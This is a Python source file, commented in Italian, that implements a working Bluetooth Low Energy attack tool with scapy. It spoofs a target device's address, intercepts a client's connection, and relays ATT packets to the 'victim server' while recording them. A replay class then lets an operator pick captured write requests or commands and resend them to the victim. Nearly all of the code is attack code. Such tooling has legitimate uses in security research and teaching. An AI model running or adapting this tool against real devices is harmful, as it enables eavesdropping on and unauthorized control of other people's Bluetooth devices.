from scapy.layers.bluetooth import *
import scapy.layers.bluetooth as bt
from scapy.all import wrpcap, rdpcap
import select
import os
from utility import *
from binascii import hexlify

class MITM:
    def __init__(self, client_sock, server_sock, server_paddr):
        self.server_sock = server_sock
        self.server_handle = None
        self.server_paddr = server_paddr

        self.client_sock = client_sock
        self.client_handle = None
        self.client_paddr = None

        self.currently_waiting = None

        self.client_sent_pkts = []

    #analizza gli eventi sollecitati dal controller e al primo connection_complete_event considera il client corrispondente catturato
    def capture_client(self, timeout):
        incoming_pkt = recv_packet(self.client_sock, timeout)
        while incoming_pkt:
            if HCI_LE_Meta_Connection_Complete in incoming_pkt:
                self.client_handle = incoming_pkt.handle
                self.client_paddr = incoming_pkt.paddr
                self.currently_waiting = self.client_sock
                return True
            incoming_pkt = recv_packet(self.client_sock, timeout)

        return False
    
    #rimane in ascolto solo su una socket per volta e cambia in base alla natura del pacchetto che si sta inoltrando
    def switch_waiting(self):
        if self.currently_waiting == self.client_sock:
            self.currently_waiting = self.server_sock
            print('Switching, now waiting for server response')

        else:
            self.currently_waiting = self.client_sock
            print('Switching, now waiting for client request')

    #inoltra i pacchetti tra una parte e l'altra
    def ATT_forward(self, recipient, pkt):
        if recipient == self.client_sock:
            to_send = HCI_Hdr()/HCI_ACL_Hdr(handle=self.client_handle)/pkt[L2CAP_Hdr]
            self.client_sock.send(to_send)

        elif recipient == self.server_sock:
            to_send = HCI_Hdr()/HCI_ACL_Hdr(handle=self.server_handle)/pkt[L2CAP_Hdr]
            self.server_sock.send(to_send)
            self.client_sent_pkts.append(to_send) #crea lista dei pacchetti inviati per un eventuale replay

        else:
            raise Exception("[ERROR] Can't forward this packet")
        
        #il write_command non si aspetta una risposta quindi non serve cambiare il socket di ascolto
        if not ATT_Write_Command in pkt:
            self.switch_waiting()

    def save_forwarded_pkts(self, file_name):
        wrpcap(file_name, self.client_sent_pkts)

    #responsabile del device address spoofing
    def enable_emulation(self, adv_data):
        pkts = [
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_Reset(),
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Random_Address(address=self.server_paddr),
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Advertising_Parameters(oatype=1),
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Advertise_Enable(enable=0),
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Advertise_Enable(enable=1),
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Advertising_Data(data=adv_data)
        ]

        if not send_all(self.client_sock, pkts):
            raise Exception("[ERROR] Failed to initialize emulation")

    #connessione al server vittima e setting della corrispondente handle per gestire la connessione successivamente
    def victim_server_connect(self):
        pkts = [
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Create_Connection(paddr=self.server_paddr)
        ]

        if not send_all(self.server_sock, pkts):
            raise Exception("[ERROR] Connection to the victim server failed")
        
        while True:
            incoming_pkt = recv_packet(self.server_sock,3)
            if not incoming_pkt:
                break
            if hasattr(incoming_pkt, 'handle'):
                server_handle = incoming_pkt.handle
        
        if not server_handle:
            raise Exception("[ERROR] Failed to retrieve server handle")
        self.server_handle = server_handle

    def run(self, timeout):
        while True:
            incoming_pkt = recv_packet(self.currently_waiting, timeout)
            #incoming_pkt.show()
            if not incoming_pkt:
                print(f"No packet has been received from client in the last {timeout} seconds, disconnecting")
                break
            
            if self.currently_waiting == self.client_sock:
                if is_ATT_Request(incoming_pkt):
                    print(f'ATT_Request [client -> server]: {incoming_pkt[HCI_ACL_Hdr]}')
                    decode(incoming_pkt)
                    self.ATT_forward(self.server_sock, incoming_pkt)
                elif ATT_Write_Command in incoming_pkt:
                    print(f'Write_Command [client -> server]: {incoming_pkt[HCI_ACL_Hdr]}')
                    decode(incoming_pkt)
                    self.ATT_forward(self.server_sock, incoming_pkt)

            else: 
                if is_ATT_Response(incoming_pkt) and self.currently_waiting == self.server_sock:
                    #incoming_pkt.show()
                    print(f'ATT_Response [server -> client]: {incoming_pkt[HCI_ACL_Hdr]}')
                    decode(incoming_pkt)
                    self.ATT_forward(self.client_sock, incoming_pkt)

class replay:
    def __init__(self, server_sock, server_paddr, pkts_list):
        self.server_sock = server_sock
        self.server_handle = None
        self.server_paddr = server_paddr

        self.pkts_list = pkts_list

        self.server_listening = False

    #invia i pacchetti al server
    def ATT_send(self, pkt):
        to_send = HCI_Hdr()/HCI_ACL_Hdr(handle=self.server_handle)/pkt[L2CAP_Hdr]
        self.server_sock.send(to_send)
        
        #il write_command non si aspetta una risposta quindi non serve cambiare il socket di ascolto
        if not ATT_Write_Command in pkt:
            self.server_listening = True

    #mostra solo i pacchetti che sono o una write o un command
    def select_pkt(self):
        for idx,pkt in enumerate(self.pkts_list):
            if ATT_Write_Request in pkt:
                data = pkt[ATT_Write_Request]
                print(f'[{idx}] Write Request\t--\tGatt Handle: {data.gatt_handle}\t|\tData: {hexlify(data.data)}')
                #pkt.show()
            if ATT_Write_Command in pkt:
                data = pkt[ATT_Write_Command]
                print(f'[{idx}] Write Command\t--\tGatt Handle: {data.gatt_handle}\t|\tData: {hexlify(data.data)}')
                #pkt.show()

        to_send_idx = int(input("Select packet to send: "))
        return to_send_idx
    
    #connessione al server vittima e setting della corrispondente handle per gestire la connessione successivamente
    def victim_server_connect(self):
        pkts = [
            HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Create_Connection(paddr=self.server_paddr)
        ]

        if not send_all(self.server_sock, pkts):
            raise Exception("[ERROR] Connection to the victim server failed")
        
        while True:
            incoming_pkt = recv_packet(self.server_sock,3)
            if not incoming_pkt:
                break
            if hasattr(incoming_pkt, 'handle'):
                server_handle = incoming_pkt.handle
        
        if not server_handle:
            raise Exception("[ERROR] Failed to retrieve server handle")
        self.server_handle = server_handle

    #propone il menu di scelta del pacchetto da inviare ad ogni iterazione
    def run(self, server_listening_timeout):
        to_send_idx = self.select_pkt()
        while to_send_idx > 0:
            self.ATT_send(self.pkts_list[to_send_idx])

            if self.server_listening:
                incoming_pkt = recv_packet(self.server_sock, server_listening_timeout)
            
                if not incoming_pkt:
                    print(f"No packet has been received from server in the last {server_listening_timeout} seconds, disconnecting")
                    break

                if is_ATT_Response(incoming_pkt):
                    #incoming_pkt.show()
                    print(f'ATT_Response [server -> client]: {incoming_pkt[HCI_ACL_Hdr]}')
                    decode(incoming_pkt)
                    self.server_listening = False 

            to_send_idx = self.select_pkt()  
        

    